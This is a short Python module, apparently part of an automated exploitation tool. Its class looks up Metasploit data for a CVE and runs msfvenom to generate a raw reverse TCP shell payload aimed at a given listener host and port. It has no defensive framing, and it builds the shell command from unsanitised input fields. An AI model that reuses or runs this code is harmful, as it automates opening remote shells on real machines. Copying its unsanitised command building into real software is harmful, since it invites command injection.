from utils import setup_logger, execute_command
from config import LOG_DIR

logger = setup_logger('PayloadService', f"{LOG_DIR}/payload_service.log")


class PayloadService:
    def __init__(self, cve_data):
        self.cve_data = cve_data

    def generate_payload(self):
        """
        Generates a payload based on the CVE data.
        """
        metasploit_info = self.cve_data.get("metasploit", "")
        if "Name" not in metasploit_info:
            logger.warning(f"No Metasploit module for {self.cve_data['cve_id']}. Skipping payload generation.")
            return {"status": "skipped", "payload": None}

        command = (
            f"msfvenom -p generic/shell_reverse_tcp "
            f"LHOST={self.cve_data['host']} LPORT={self.cve_data['port']} -f raw"
        )
        result = execute_command(command, logger)

        if result["status"] == "success":
            return {"status": "success", "payload": result["output"], "command": command}
        return {"status": "error", "message": result["error"]}
